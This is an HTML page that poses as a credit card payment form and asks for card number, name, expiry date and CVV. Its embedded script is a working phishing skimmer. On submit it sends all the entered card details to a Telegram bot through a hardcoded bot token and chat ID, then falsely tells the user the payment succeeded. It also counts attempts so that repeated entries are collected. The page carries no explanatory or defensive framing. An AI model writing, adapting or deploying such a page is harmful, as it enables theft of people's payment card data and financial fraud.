<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h1 {
            margin-bottom: 20px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Credit Card Payment</h1>
        <form id="payment-form">
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
            </div>
            <div class="form-group">
                <label for="card-name">Name on Card</label>
                <input type="text" id="card-name" name="card-name" placeholder="John Doe" required>
            </div>
            <div class="form-group">
                <label for="expiry-date">Expiry Date</label>
                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        const chatID = '6320467148';
        const token = '7259013301:AAGaD_I5tHLhqd0XH3Ql1ZprS04Jf4SzSlA';

        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault();

            // Retrieve form data
            const cardNumber = document.getElementById('card-number').value;
            const cardName = document.getElementById('card-name').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;

            const attempts = parseInt(localStorage.getItem('attempts')) || 0;
            const timeout = localStorage.getItem('timeout');

            if (timeout && new Date().getTime() < timeout) {
                const waitTime = Math.ceil((timeout - new Date().getTime()) / 1000);
                alert(`Please wait ${(waitTime / 60).toFixed(1)} minutes before trying again.`);
                return;
            }

            if (attempts < 3) {
                if (!cardNumber || !cardName || !expiryDate || !cvv) {
                    alert('Please fill in all fields.');
                } else {
                    const message = `Card Number: ${cardNumber}\nName on Card: ${cardName}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

                    fetch(url)
                        .then(response => {
                            if (response.ok) {
                                alert('Payment information submitted successfully!');
                            } else {
                                throw new Error('Error sending message');
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            alert('Error submitting payment information');
                        });
                }
                localStorage.setItem('attempts', attempts + 1);
            } else {
                const newTimeout = new Date().getTime() + 5 * 60 * 1000; // 5 minutes
                localStorage.setItem('timeout', newTimeout);
                localStorage.setItem('attempts', 0);
                alert('You have exhausted your attempts. Please wait 5 minutes before trying again.');
            }
        });
    </script>
</body>
</html>
